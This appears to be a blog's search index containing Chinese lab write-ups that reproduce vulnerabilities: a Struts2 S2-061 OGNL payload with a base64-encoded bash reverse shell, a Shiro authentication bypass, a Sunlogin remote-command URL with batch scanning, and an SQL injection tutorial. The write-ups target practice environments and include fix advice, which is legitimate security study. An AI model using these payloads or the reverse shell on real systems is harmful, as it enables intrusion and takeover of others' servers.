<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Struts2 S2-061 远程命令执行漏洞（CVE-2020-17530）复现</title>
      <link href="/2023/03/29/Struts2-S2-061-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2020-17530%EF%BC%89%E5%A4%8D%E7%8E%B0/"/>
      <url>/2023/03/29/Struts2-S2-061-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2020-17530%EF%BC%89%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>Apache Struts2框架是一个用于开发Java EE网络应用程序的Web框架。Apache Struts于2020年12月08日披露 S2-061 Struts 远程代码执行漏洞(CVE-2020-17530)，在使用某些tag等情况下可能存在OGNL表达式注入漏洞，从而造成远程代码执行，风险极大，S2-061是对S2-059漏洞修复后的绕过。</p><p>影响版本：</p><p>Apache Struts 2.0.0 - 2.5.25</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>这里使用vulhub漏洞环境搭建</p><p>使用git克隆到本地</p><p><code>git clone https://github.com/vulhub/vulhub.git</code></p><p><img src="https://s2.loli.net/2023/03/29/pw6MsSl3Gh9OVFC.png" class="lazyload" data-srcset="https://s2.loli.net/2023/03/29/pw6MsSl3Gh9OVFC.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20221210152107512"></p><p>进入对应环境</p><p><code>cd vulhub/struts2/s2-061</code></p><p><img src="https://s2.loli.net/2023/03/29/qMJ1AjhwcPyZvCQ.png" class="lazyload" data-srcset="https://s2.loli.net/2023/03/29/qMJ1AjhwcPyZvCQ.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20221210152142885"></p><p>启动docker漏洞环境</p><p><code>sudo docker-compose up -d</code></p><p><img src="https://s2.loli.net/2023/03/29/FBkQSfqNDtjl4Rs.png" class="lazyload" data-srcset="https://s2.loli.net/2023/03/29/FBkQSfqNDtjl4Rs.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20221210152205091"></p><p>访问对应地址，出现如下页面，环境搭建成功</p><p><img src="https://s2.loli.net/2023/03/29/gysCRZP8WVzSuLY.png" class="lazyload" data-srcset="https://s2.loli.net/2023/03/29/gysCRZP8WVzSuLY.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20221210153856655"></p><h2 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h2><p>实现判断下是否存在漏洞，使用?id&#x3D;%25{7*7}查看返回id的值是7*7还是49，如果是47那么就说明进行了二次表达式解析，存在改漏洞</p><p><img src="https://s2.loli.net/2023/03/29/LlBdxGmzX7YfWiA.png" class="lazyload" data-srcset="https://s2.loli.net/2023/03/29/LlBdxGmzX7YfWiA.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20221210160031545"></p><p>这里id为49说明存在该漏洞。抓包修改为以下，这里的<code>#arglist.add(&quot;xx&quot;)</code>函数这里包含的值是你要执行的命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">POST /.action HTTP/1.1</span><br><span class="line">Host: 192.168.52.128:8080</span><br><span class="line">User-Agent: xxx</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: JSESSIONID=node0i3sptalo62q6kw46qu49oxwn1.node0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryl7d1B1aGsV2wcZwF</span><br><span class="line">Content-Length: 833</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryl7d1B1aGsV2wcZwF</span><br><span class="line">Content-Disposition: form-data; name=&quot;id&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">%&#123;(#instancemanager=#application[&quot;org.apache.tomcat.InstanceManager&quot;]).(#stack=#attr[&quot;com.opensymphony.xwork2.util.ValueStack.ValueStack&quot;]).(#bean=#instancemanager.newInstance(&quot;org.apache.commons.collections.BeanMap&quot;)).(#bean.setBean(#stack)).(#context=#bean.get(&quot;context&quot;)).(#bean.setBean(#context)).(#macc=#bean.get(&quot;memberAccess&quot;)).(#bean.setBean(#macc)).(#emptyset=#instancemanager.newInstance(&quot;java.util.HashSet&quot;)).(#bean.put(&quot;excludedClasses&quot;,#emptyset)).(#bean.put(&quot;excludedPackageNames&quot;,#emptyset)).(#arglist=#instancemanager.newInstance(&quot;java.util.ArrayList&quot;)).(#arglist.add(&quot;ls&quot;)).(#execute=#instancemanager.newInstance(&quot;freemarker.template.utility.Execute&quot;)).(#execute.exec(#arglist))&#125;</span><br><span class="line">------WebKitFormBoundaryl7d1B1aGsV2wcZwF--</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/03/29/4F8P7AkrgiKdXCc.png" class="lazyload" data-srcset="https://s2.loli.net/2023/03/29/4F8P7AkrgiKdXCc.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20221210161714309"></p><p>已经可以执行我们的命令了，接下来反弹shell</p><p>在vps上监听3333端口：<code>nc -lvnp 3333</code></p><p>编写反弹shell代码</p><p><code>bash -i &gt;&amp; /dev/tcp/192.168.52.130/3333 0&gt;&amp;1</code></p><p>反弹shell涉及到管道符问题要将命令进行base64编码</p><p><code>bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjUyLjEzMC8zMzMzIDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</code></p><p><img src="https://s2.loli.net/2023/03/29/VSOARQWsI8EBxTY.png" class="lazyload" data-srcset="https://s2.loli.net/2023/03/29/VSOARQWsI8EBxTY.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20221210163917170"></p><p><img src="https://s2.loli.net/2023/03/29/gdhMeHEqvSIk4U9.png" class="lazyload" data-srcset="https://s2.loli.net/2023/03/29/gdhMeHEqvSIk4U9.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20221210164523698"></p><p>成功反弹出shell</p><p>检查POC</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">url</span>():</span><br><span class="line">parser = argparse.ArgumentParser(description=<span class="string">&#x27;S2-061  CVE-2020-17530&#x27;</span>)</span><br><span class="line">parser.add_argument(<span class="string">&#x27;target_url&#x27;</span>,<span class="built_in">type</span>=<span class="built_in">str</span>,<span class="built_in">help</span>=<span class="string">&#x27;The target address,example: http://192.168.52.128:8080&#x27;</span>)</span><br><span class="line">args = parser.parse_args()</span><br><span class="line"><span class="keyword">global</span> url</span><br><span class="line">url = args.target_url</span><br><span class="line"><span class="keyword">if</span> url.startswith(<span class="string">&#x27;http://&#x27;</span>) <span class="keyword">or</span> url.startswith(<span class="string">&#x27;https://&#x27;</span>):</span><br><span class="line"><span class="keyword">pass</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;请使用http://或者https://&#x27;</span>)</span><br><span class="line">os._exit(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">if</span> url.endswith(<span class="string">&#x27;/&#x27;</span>):</span><br><span class="line">url = url[:-<span class="number">1</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;开始测试&quot;</span>)</span><br><span class="line"><span class="keyword">return</span> url</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">poc</span>():</span><br><span class="line">headers=&#123;</span><br><span class="line"><span class="string">&#x27;User-Agent&#x27;</span>:<span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100102 Firefox/107.0&#x27;</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">vul_url = url + <span class="string">&#x27;/?id=%25&#123;7*7&#125;&#x27;</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">text = requests.get(vul_url,headers=headers,timeout=<span class="number">10</span>).text</span><br><span class="line"><span class="keyword">if</span> <span class="string">&#x27;49&#x27;</span> <span class="keyword">in</span> text:</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;[漏洞存在]&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;[漏洞不存在]&#x27;</span>)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;[发生错误]&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">url()</span><br><span class="line">poc()</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/03/29/Fxmt4Bah5ipH6Xw.png" class="lazyload" data-srcset="https://s2.loli.net/2023/03/29/Fxmt4Bah5ipH6Xw.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20221210170934924"></p><h2 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h2><p>升级到 Struts 2.5.26 版本或更高版本</p>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Struts2 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Shiro 身份认证绕过漏洞 CVE-2022-32532</title>
      <link href="/2023/03/29/Shiro-%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E-CVE-2022-32532/"/>
      <url>/2023/03/29/Shiro-%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E-CVE-2022-32532/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Apache Shiro 是一个强大且易用的 Java 安全框架，通过它可以执行身份验证、授权、密码和会话管理。使用 Shiro 的易用 API，您可以快速、轻松地保护任何应用程序 —— 从最小的移动应用程序到最大的 WEB 和企业应用程序。</span><br><span class="line"></span><br><span class="line">2022年6月29日，Apache官方披露Apache Shiro权限绕过漏洞(CVE-2022-32532)，当Apache Shiro中使用RegexRequestMatcher进行权限配置，且正则表达式中携带&quot;.&quot;时，未经授权的远程攻击者可通过构造恶意数据包绕过身份认证，导致配置的权限验证失效。</span><br></pre></td></tr></table></figure><h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><p><code>Apache Shiro &lt; 1.9.1</code></p><h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">根据java正则表达式的特点，在正则表达式中元字符.是匹配除换行符之外的任何单个字符。</span><br><span class="line">新增Pattern.DOTALL模式后，正则表达式.就可以匹配任何字符包括换行符。</span><br><span class="line">在shiro-core-1.9.0.jar中存在一个RegExPatternMatcher类，提供请求路径匹配功能及拦截器参数解析的功能。这个类的Pattern存在带.的正则表达式匹配，如果存在/n或/r字符时，就会判断错误。</span><br></pre></td></tr></table></figure><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>直接使用vulfocus的镜像环境</p><p><img src="https://s2.loli.net/2023/03/29/gioCqn16KmD4H3y.png" class="lazyload" data-srcset="https://s2.loli.net/2023/03/29/gioCqn16KmD4H3y.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20230222160039366"></p><p>启动靶场后直接访问给的地址就行</p><p><img src="https://s2.loli.net/2023/03/29/jbewJR7il4oQKHL.png" class="lazyload" data-srcset="https://s2.loli.net/2023/03/29/jbewJR7il4oQKHL.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20230222160444747"></p><p><img src="https://s2.loli.net/2023/03/29/azknmPjTiDSbw9s.png" class="lazyload" data-srcset="https://s2.loli.net/2023/03/29/azknmPjTiDSbw9s.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20230222160450931"></p><h2 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h2><p>测试直接访问敏感地址访问被拒绝</p><p><img src="https://s2.loli.net/2023/03/29/CDAQPXOvMZkSsyb.png" class="lazyload" data-srcset="https://s2.loli.net/2023/03/29/CDAQPXOvMZkSsyb.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20230222160528823"></p><p>我们抓一下get包，放在Repeater模块</p><h3 id="使用-0a进行权限绕过"><a href="#使用-0a进行权限绕过" class="headerlink" title="使用%0a进行权限绕过"></a>使用%0a进行权限绕过</h3><p>%0a是换行符</p><p><img src="https://s2.loli.net/2023/03/29/R5KJMGPhtxAIaCQ.png" class="lazyload" data-srcset="https://s2.loli.net/2023/03/29/R5KJMGPhtxAIaCQ.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20230222161704254"></p><p>访问成功返回success</p><h2 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h2><p>建议尽快升级至Apache Shiro 1.9.1及以上版本</p>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Shiro </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CNVD-2022-10270/03672 向日葵RCE复现</title>
      <link href="/2023/03/29/CNVD-2022-10270-03672-%E5%90%91%E6%97%A5%E8%91%B5RCE%E5%A4%8D%E7%8E%B0/"/>
      <url>/2023/03/29/CNVD-2022-10270-03672-%E5%90%91%E6%97%A5%E8%91%B5RCE%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>向日葵是一款免费的集远程控制电脑手机、远程桌面连接、远程开机、远程管理、支持内网穿透的一体化远程控制管理工具软件。</p><p>于2022年2月5日和2022年2月15日，CNVD公开上海贝锐信息科技股份有限公司的向日葵远控软件存在远程代码执行漏洞（CNVD-2022-10270&#x2F;CNVD-2022-03672），影响Windows系统使用的个人版和简约版，攻击者可利用该漏洞获取服务器控制权。</p><h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">向日葵个人版   <span class="keyword">for</span> <span class="title class_">Windows</span> &lt;= <span class="number">11.0</span>.<span class="number">0.33</span></span><br><span class="line">向日葵简约版   &lt;= V1.<span class="number">0.1</span>.<span class="number">43315</span>（<span class="number">2021.12</span>）</span><br></pre></td></tr></table></figure><h3 id="漏洞级别"><a href="#漏洞级别" class="headerlink" title="漏洞级别"></a>漏洞级别</h3><p><strong>高危</strong></p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>在虚拟机里安装11.0.0.33的低版本向日葵</p><p><img src="https://s2.loli.net/2023/03/29/nYfVZ2ULrPuE85I.png" class="lazyload" data-srcset="https://s2.loli.net/2023/03/29/nYfVZ2ULrPuE85I.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20230219135253229"></p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>使用nmap或其他工具探测目标端口</p><p><img src="https://s2.loli.net/2023/03/29/d8BOl9vWjsfwGrm.png" class="lazyload" data-srcset="https://s2.loli.net/2023/03/29/d8BOl9vWjsfwGrm.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20230219135507131"></p><p>在浏览器中访问ip+端口号+cgi-bin&#x2F;rpc?action&#x3D;verify-haras  （端口号：每一个都尝试，直到获取到session值CID）</p><p><img src="https://s2.loli.net/2023/03/29/jg3EFkQN9ciVDOM.png" class="lazyload" data-srcset="https://s2.loli.net/2023/03/29/jg3EFkQN9ciVDOM.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20230219151000880"></p><p>Cookies添加拿到的CID后加上payload请求</p><p><code>http://192.168.52.133:49437/check?cmd=ping../../../../../../../../../windows/system32/WindowsPowerShell/v1.0/powershell.exe+ whoami</code></p><p><img src="https://s2.loli.net/2023/03/29/IMBCb6R7mZqFlTU.png" class="lazyload" data-srcset="https://s2.loli.net/2023/03/29/IMBCb6R7mZqFlTU.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20230219151000880"></p><p><img src="https://s2.loli.net/2023/03/29/FluGp8dAs2xzeBO.png" class="lazyload" data-srcset="https://s2.loli.net/2023/03/29/FluGp8dAs2xzeBO.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20230219151134780"></p><p>手动复现完成</p><h3 id="工具使用"><a href="#工具使用" class="headerlink" title="工具使用"></a>工具使用</h3><p>使用工具自带的扫描</p><p><code>xrkRce.exe</code> -h ip -t scan</p><p><img src="https://s2.loli.net/2023/03/29/8k4Dbr9FI3CTadt.png" class="lazyload" data-srcset="https://s2.loli.net/2023/03/29/8k4Dbr9FI3CTadt.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20230219152233952"></p><p>测试命令执行</p><p><img src="https://s2.loli.net/2023/03/29/KUBEF3bq6nfHNW9.png" class="lazyload" data-srcset="https://s2.loli.net/2023/03/29/KUBEF3bq6nfHNW9.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20230219153035239"></p><h3 id="批量检测"><a href="#批量检测" class="headerlink" title="批量检测"></a>批量检测</h3><p><code>python3 sunlogin-fuzz.py -t 192.168.52.128/25</code></p><p><img src="https://s2.loli.net/2023/03/29/EtHfgymwTx5ZVI4.png" class="lazyload" data-srcset="https://s2.loli.net/2023/03/29/EtHfgymwTx5ZVI4.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20230219162629384"></p>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 向日葵 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>常见sql注入手法总结与技巧(一)</title>
      <link href="/2023/03/24/%E5%B8%B8%E8%A7%81sql%E6%B3%A8%E5%85%A5%E6%89%8B%E6%B3%95%E6%80%BB%E7%BB%93%E4%B8%8E%E6%8A%80%E5%B7%A7-%E4%B8%80/"/>
      <url>/2023/03/24/%E5%B8%B8%E8%A7%81sql%E6%B3%A8%E5%85%A5%E6%89%8B%E6%B3%95%E6%80%BB%E7%BB%93%E4%B8%8E%E6%8A%80%E5%B7%A7-%E4%B8%80/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>SQL 是 Structured Query Language 的缩写，中文译为“结构化查询语言”。SQL 是一种计算机语言，用来存储、检索和修改关系型数据库中存储的数据。</p><p>sql注入是最为常见也是破坏力很大的漏洞，它是因为开发在开发时没有对用户的输入行为进行判断和过滤，使得用户输入了恶意语句后传给了后端数据库进行相应的动作（如增删改查甚至写后门）。</p><p><strong>根本产生原因：</strong>后端服务器接收传来的参数未经过严格过滤判断而直接进入数据库查询</p><p>所以在学习SQL注入前需要了解SQL基础语法</p><h2 id="SQL注入根源分析"><a href="#SQL注入根源分析" class="headerlink" title="SQL注入根源分析"></a>SQL注入根源分析</h2><p>如果后台sql语句为：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$<span class="keyword">sql</span><span class="operator">=</span>&quot;SELECT * FROM users WHERE id=&#x27; $id &#x27; LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure><p>如果我们传入id&#x3D;1’  那么如果后端没有经过过滤而是直接把我们传入的参数带进sql语句中，那么sql语句就会变成：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$<span class="keyword">sql</span><span class="operator">=</span>&quot;SELECT * FROM users WHERE id=&#x27;1&#x27;&#x27; LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure><p>我们传入的 ‘ 就会一块带入和前面的单引号进行闭合，导致原来后面的单引号就多余，而sql语句引号是必须成对出现的就会报错什么都查不出来，但如果我们在1’后面加入恶意语句并且把后面的原来的语句进行注解，就会造成sql语句会执行我们传入的恶意语句，实现注入。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">id <span class="operator">=</span> <span class="number">-1</span><span class="string">&#x27; union select database() #</span></span><br><span class="line"><span class="string">$sql=&quot;SELECT * FROM users WHERE id=&#x27;</span><span class="number">-1</span><span class="string">&#x27; union select database() #&#x27;</span> LIMIT <span class="number">0</span>,<span class="number">1</span>&quot;;</span><br></pre></td></tr></table></figure><p>-1表示查询一个不存在的id，是为了不影响后面我们的注入语句</p><p>#,–+,– 表示注释，把后面所有语句注释掉，这样就不会影响我们的注入语句</p><h2 id="sql参数类型分类"><a href="#sql参数类型分类" class="headerlink" title="sql参数类型分类"></a>sql参数类型分类</h2><p>SQL注入按照参数类型分类可分为两种：数字型和字符型</p><ol><li>数字型：select * from table where id&#x3D;2</li><li>字符型：select * from table where id&#x3D;’2’</li></ol><p>区别在于数字型不需要单引号进行闭合，而字符型一般需要通过单引号闭合。</p><p>判断类型方法：</p><p>​构造payload为：<code>id=1 order by 9999 --+</code></p><p>如果正确返回页面，则为字符型；否则，为数字型</p><p>​构造payload为：<code>1 and 1=2</code></p><p>如果正确返回页面，则为字符型；否则，为数字型</p><h2 id="常见sql注入手法"><a href="#常见sql注入手法" class="headerlink" title="常见sql注入手法"></a>常见sql注入手法</h2><p>这里先给出常用的payload，后面会使用到</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> database()</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> group_concat(table_name)<span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database()</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> group_concat(column_name)<span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;xxxx&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> group_concat(字段名) <span class="keyword">from</span> 表名</span><br></pre></td></tr></table></figure><h3 id="常见注入手法分类"><a href="#常见注入手法分类" class="headerlink" title="常见注入手法分类"></a>常见注入手法分类</h3><p>布尔盲注</p><p>时间盲注</p><p>union联合注入</p><p>报错注入</p><p>堆叠注入</p><p>二次注入</p><p>宽字节注入</p><p>通过sql注入写webshell</p><p>通过http header注入</p><p>…</p><h3 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h3><p>通常根据SQL注入是否有回显将其分为有回显的注入和无回显的注入，其中无回显的注入就是盲注。</p><p>我们的注入语句可能会让网页呈现两种状态，例如“查询成功”，“查询失败”，相当于true和false。也可能是一句“查询完成”或者什么都不说。虽然并不能直接得到数据库中的具体数据，但是SQL语句的拼接已经发生了，非法的SQL也执行了，SQL注入攻击就发生了，只是SQL注入的结果不能直接拿到。</p><p>盲注就是针对这种无回显的情况，盲注就像是爆破，在进行SQL盲注时，大致过程为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">如果&quot;数据库XX&quot;的第一个字母是a，就返回“查询成功”，否则返回“查询失败”</span><br><span class="line">如果&quot;数据库XX&quot;的第一个字母是b，就返回“查询成功”，否则返回“查询失败”</span><br><span class="line">如果&quot;数据库XX&quot;的第一个字母是c，就返回“查询成功”，否则返回“查询失败”</span><br><span class="line">...</span><br><span class="line">如果&quot;数据库XX&quot;的第二个字母是a，就返回“查询成功”，否则返回“查询失败”</span><br><span class="line">如果&quot;数据库XX&quot;的第二个字母是b，就返回“查询成功”，否则返回“查询失败”</span><br><span class="line">如果&quot;数据库XX&quot;的第二个字母是c，就返回“查询成功”，否则返回“查询失败”</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>通过这样不断的测试爆破，根据回显的“查询成功”和“查询失败”，判断出具体数据的每一位是什么，就可以完整的得到这个数据的具体值了。</p><h4 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h4><p>下面使用sqli-labs靶场演示,less-8关</p><p>查询成功返回You are in….</p><p><img src="https://s3.bmp.ovh/imgs/2023/03/24/3a4c28e9dd204283.png" class="lazyload" data-srcset="https://s3.bmp.ovh/imgs/2023/03/24/3a4c28e9dd204283.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><p>而查询失败则什么都不显示</p><p><img src="https://s3.bmp.ovh/imgs/2023/03/24/8ad3a277135c7acd.png" class="lazyload" data-srcset="https://s3.bmp.ovh/imgs/2023/03/24/8ad3a277135c7acd.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><p>返回You are in….相当于是“查询成功”，而什么都没显示则相当于是“查询失败”。所以我们构造的判断语句，可以根据页面是否有You are in….来充当判断条件。</p><p><strong>要使用的sql函数：</strong></p><p>substr(要截取的字符串，从哪一位开始截取，截取多长)</p><p>ascii()返回传入字符串的首字母的ASCII码</p><p><strong>获取当前数据库名</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span 